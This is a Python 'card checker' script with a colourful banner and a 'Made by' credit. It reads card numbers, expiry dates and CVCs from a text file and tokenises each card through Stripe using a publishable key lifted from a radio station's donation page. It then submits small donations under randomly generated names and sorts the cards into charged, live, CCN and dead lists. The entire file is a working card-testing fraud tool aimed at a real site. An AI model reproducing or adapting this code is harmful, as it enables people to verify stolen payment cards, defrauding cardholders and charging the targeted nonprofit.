import requests
import names
import random
import time
import uuid
import sys
from colorama import Fore, Style, init


init(autoreset=True)

def print_banner():
    banner = f"""
{Fore.CYAN}
    ╔═══════════════════════════════════════════════╗
    ║                                               ║
    ║    {Fore.MAGENTA} ██████╗ ███████╗███╗   ██╗███████╗    {Fore.CYAN}║
    ║    {Fore.MAGENTA}██╔════╝ ██╔════╝████╗  ██║╚══███╔╝    {Fore.CYAN}║
    ║    {Fore.MAGENTA}██║  ███╗█████╗  ██╔██╗ ██║  ███╔╝     {Fore.CYAN}║
    ║    {Fore.MAGENTA}██║   ██║██╔══╝  ██║╚██╗██║ ███╔╝      {Fore.CYAN}║
    ║    {Fore.MAGENTA}╚██████╔╝███████╗██║ ╚████║███████╗    {Fore.CYAN}║
    ║    {Fore.MAGENTA} ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝    {Fore.CYAN}║
    ║                                               ║
    ║         {Fore.YELLOW}Made by @Zyncen{Fore.CYAN}          ║
    ║                                               ║
    ╚═══════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)

def animate_text(text, color=Fore.WHITE, delay=0.03):
    for char in text:
        print(color + char, end='', flush=True)
        time.sleep(delay)
    print()

def generate_random_name():
    return names.get_first_name() + names.get_last_name()

def generate_random_time():
    return int(time.time()) - random.randint(100, 1000)

def spinning_cursor():
    while True:
        for cursor in '|/-\\':
            yield cursor

spinner = spinning_cursor()

def process_card(cc, mm, yy, cvc, max_retries=3):
    generated_name = generate_random_name()
    generated_first_name = names.get_first_name()
    generated_last_name = names.get_last_name()
    generated_time_opened = generate_random_time()
    generated_time_on_page = random.randint(5000, 30000) 
    
    headers_stripe = {
        'accept': 'application/json',
        'accept-language': 'en',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://checkout.stripe.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://checkout.stripe.com/',
        'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }

    data_stripe = (
        f'card%5Bexp_month%5D={mm}&card%5Bexp_year%5D={yy}&card%5Bname%5D={generated_name}%40gmail.com&card%5Bnumber%5D={cc}&card%5Bcvc%5D={cvc}'
        f'&device_id={str(uuid.uuid4())}&email={generated_name}%40gmail.com&guid={str(uuid.uuid4())}{random.randint(100000, 999999)}'
        f'&key=pk_live_bo0vDI5OvZ8Hw4xyUr4wTgFt&muid={str(uuid.uuid4())}{random.randint(100000, 999999)}' 
        f'&referrer=https%3A%2F%2Fkfoi.creek.fm%2Fsupport-us&sid={str(uuid.uuid4())}{random.randint(100000, 999999)}' 
        f'&time_checkout_loaded={int(time.time())}&time_checkout_opened={generated_time_opened}&time_on_page={generated_time_on_page}'
        f'&user_agent=Mozilla%2F5.0%20(X11%3B%20Linux%20x86_64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F139.0.0.0%20Safari%2F537.36&validation_type=card'
    )

   
    for retry in range(max_retries):
        try:
            print(f"{Fore.CYAN}[{next(spinner)}] Contacting Stripe API...", end='\r')
            response_stripe = requests.post('https://api.stripe.com/v1/tokens', headers=headers_stripe, data=data_stripe, timeout=30)
            response_stripe.raise_for_status() 
            
            stripe_data = response_stripe.json()
            
            tok = stripe_data.get('id')
            if not tok:
                error_message = stripe_data.get('error', {}).get('message', 'Unknown Stripe tokenization error')
                return f"{Fore.RED}✗ FAIL | {cc}|{mm}|{yy}|{cvc} | Stripe Tokenization Failed: {error_message}", "dead"
            break  
                
        except requests.exceptions.RequestException as e:
            if retry < max_retries - 1:
                print(f"{Fore.YELLOW}[!] Stripe connection failed, retrying ({retry + 1}/{max_retries})...")
                time.sleep(2)  # Wait before retry
                continue
            else:
                return f"{Fore.RED}✗ FAIL | {cc}|{mm}|{yy}|{cvc} | Stripe Tokenization Connection Error: {e}", "dead"
        except ValueError:
            return f"{Fore.RED}✗ FAIL | {cc}|{mm}|{yy}|{cvc} | Stripe Tokenization JSON Decode Error: {response_stripe.text}", "dead"

    headers_donation = {
        'accept': 'text/html, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://kfoi.creek.fm',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://kfoi.creek.fm/support-us',
        'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data_donation = {
        'data[donation_amount]': '5.00',
        'data[donation_amount_custom]': '',
        'data[User][email]': f'{generated_name}@gmail.com',
        'data[User][password]': 'SuperSecretpassword123!',
        'data[User][confirm_password]': 'SuperSecretpassword123!',
        'data[Profile][first_name]': generated_first_name,
        'data[Profile][last_name]': generated_last_name,
        'stripeToken': tok,
    }

    
    for retry in range(max_retries):
        try:
            print(f"{Fore.CYAN}[{next(spinner)}] Processing donation...", end='\r')
            response_donation = requests.post('https://kfoi.creek.fm/support-us', headers=headers_donation, data=data_donation, timeout=30)
            response_donation.raise_for_status() 
            
            donation_response = response_donation.text
            
            
            try:
                donation_data = response_donation.json()
                success = donation_data.get('success', False)
                
                
                form_errors = donation_data.get('formerrors', {}) or donation_data.get('formErrors', {})
                
                if success:
                    return f"{Fore.GREEN}✓ CHARGE | {cc}|{mm}|{yy}|{cvc} | Success! {Fore.GREEN}💳", "charged"
                else:
                   
                    card_errors = form_errors.get('card', {}) or form_errors.get('Card', {})
                    stripe_error = card_errors.get('stripetoken', '') or card_errors.get('stripeToken', '')
                    
                    
                    raw_error = stripe_error if stripe_error else str(card_errors)
                    
                    if not raw_error or raw_error == '{}':
                        raw_error = str(form_errors) if form_errors else "No specific error message"
                    
                    
                    if raw_error and raw_error != '{}':
                        raw_error = raw_error.replace('{', '').replace('}', '').replace("'", "")
                    
                    if 'declined' in raw_error.lower():
                        if 'insufficient' in raw_error.lower() or 'funds' in raw_error.lower():
                            return f"{Fore.YELLOW}✓ LIVE | {cc}|{mm}|{yy}|{cvc} | Insufficient Funds --> {raw_error} {Fore.YELLOW}💰", "live"
                        else:
                            return f"{Fore.RED}✗ DECLINED | {cc}|{mm}|{yy}|{cvc} | Card Declined --> {raw_error} {Fore.RED}🚫", "dead"
                    elif 'cvc' in raw_error.lower() or 'security code' in raw_error.lower():
                        return f"{Fore.BLUE}✓ CCN | {cc}|{mm}|{yy}|{cvc} | Security Code Required --> {raw_error} {Fore.BLUE}🔒", "ccn"
                    elif 'invalid' in raw_error.lower() or 'incorrect' in raw_error.lower():
                        return f"{Fore.RED}✗ INVALID | {cc}|{mm}|{yy}|{cvc} | Invalid Card --> {raw_error} {Fore.RED}❌", "dead"
                    else:
                        return f"{Fore.RED}✗ DECLINED | {cc}|{mm}|{yy}|{cvc} | {raw_error} {Fore.RED}💀", "dead"
                        
            except ValueError as json_error:
                
                donation_response_lower = donation_response.lower()
                if "success" in donation_response_lower and "true" in donation_response_lower:
                    return f"{Fore.GREEN}✓ CHARGE | {cc}|{mm}|{yy}|{cvc} | Success! {Fore.GREEN}💳", "charged"
                elif "insufficient funds" in donation_response_lower:
                    return f"{Fore.YELLOW}✓ LIVE | {cc}|{mm}|{yy}|{cvc} | Insufficient Funds --> {donation_response} {Fore.YELLOW}💰", "live"
                elif "security code" in donation_response_lower or "cvc" in donation_response_lower:
                    return f"{Fore.BLUE}✓ CCN | {cc}|{mm}|{yy}|{cvc} | Security Code Required --> {donation_response} {Fore.BLUE}🔒", "ccn"
                elif "declined" in donation_response_lower:
                    return f"{Fore.RED}✗ DECLINED | {cc}|{mm}|{yy}|{cvc} | Card Declined --> {donation_response} {Fore.RED}🚫", "dead"
                else:
                    return f"{Fore.RED}✗ DEAD | {cc}|{mm}|{yy}|{cvc} | Unknown Response --> {donation_response} {Fore.RED}💀", "dead"
            
            break  

        except requests.exceptions.RequestException as e:
            if retry < max_retries - 1:
                print(f"{Fore.YELLOW}[!] Donation connection failed, retrying ({retry + 1}/{max_retries})...")
                time.sleep(0.5)  
                continue
            else:
                return f"{Fore.RED}✗ FAIL | {cc}|{mm}|{yy}|{cvc} | Donation Submission Connection Error: {e}", "dead"

def main():
    print_banner()
    time.sleep(1)
    
    animate_text("🚀 Initializing Card Processor...", Fore.CYAN)
    animate_text("📁 Loading card data from cc.txt...", Fore.BLUE)
    
    try:
        with open('cc.txt', 'r') as f_in:
            cc_list = f_in.readlines()
    except FileNotFoundError:
        animate_text(f"{Fore.RED}❌ Error: cc.txt not found. Please create a file named cc.txt with card details.", Fore.RED)
        return

    charged_cards = []
    live_cards = []
    ccn_cards = []
    dead_cards = []

    print(f"\n{Fore.GREEN}✅ Found {len(cc_list)} cards to process{Style.RESET_ALL}")
    print(f"{Fore.CYAN}⏳ Starting processing...{Style.RESET_ALL}\n")
    
    time.sleep(1)

    for i, line in enumerate(cc_list):
        parts = line.strip().split('|')
        if len(parts) == 4:
            cc, mm, yy, cvc = parts
            print(f"{Fore.WHITE}[{i+1}/{len(cc_list)}] {Fore.CYAN}Checking: {cc}|{mm}|{yy}|{cvc}")
            result_message, status = process_card(cc, mm, yy, cvc)
            print(" " * 50, end='\r')  
            print(result_message)

            if status == "charged":
                charged_cards.append(result_message)
            elif status == "live":
                live_cards.append(result_message)
            elif status == "ccn":
                ccn_cards.append(result_message)
            else:
                dead_cards.append(result_message)
                
            
            time.sleep(0.5)
        else:
            print(f"{Fore.RED}⚠ Skipping invalid line format: {line.strip()}")

  
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"📊 PROCESSING SUMMARY")
    print(f"{'='*60}{Style.RESET_ALL}")

    if charged_cards:
        print(f"\n{Fore.GREEN}🎯 CHARGED CARDS ({len(charged_cards)}){Style.RESET_ALL}")
        with open('charged.txt', 'w') as f_charged:
            for card in charged_cards:
                
                clean_card = card.replace(Fore.GREEN, '').replace(Style.RESET_ALL, '').replace('💳', '')
                f_charged.write(clean_card + '\n')
                print(f"  {card}")
        print(f"{Fore.GREEN}✅ Saved {len(charged_cards)} charged cards to charged.txt{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}📭 No cards were charged successfully.{Style.RESET_ALL}")

    if live_cards:
        print(f"\n{Fore.YELLOW}💳 LIVE CARDS ({len(live_cards)}){Style.RESET_ALL}")
        with open('live.txt', 'w') as f_live:
            for card in live_cards:
                clean_card = card.replace(Fore.YELLOW, '').replace(Style.RESET_ALL, '').replace('💰', '')
                f_live.write(clean_card + '\n')
                print(f"  {card}")
        print(f"{Fore.YELLOW}✅ Saved {len(live_cards)} live cards to live.txt{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}📭 No live cards found with insufficient funds.{Style.RESET_ALL}")

    if ccn_cards:
        print(f"\n{Fore.BLUE}🔒 CCN CARDS ({len(ccn_cards)}){Style.RESET_ALL}")
        with open('ccn.txt', 'w') as f_ccn:
            for card in ccn_cards:
                clean_card = card.replace(Fore.BLUE, '').replace(Style.RESET_ALL, '').replace('🔒', '')
                f_ccn.write(clean_card + '\n')
                print(f"  {card}")
        print(f"{Fore.BLUE}✅ Saved {len(ccn_cards)} CCN cards to ccn.txt{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}📭 No CCN cards found.{Style.RESET_ALL}")

    if dead_cards:
        print(f"\n{Fore.RED}💀 DEAD CARDS ({len(dead_cards)}){Style.RESET_ALL}")
        for card in dead_cards:
            print(f"  {card}")
        print(f"{Fore.RED}❌ {len(dead_cards)} cards were dead or failed.{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}🎉 All cards were either charged, live, or CCN!{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"✨ Processing completed! Made by @Zyncen")
    print(f"{'='*60}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()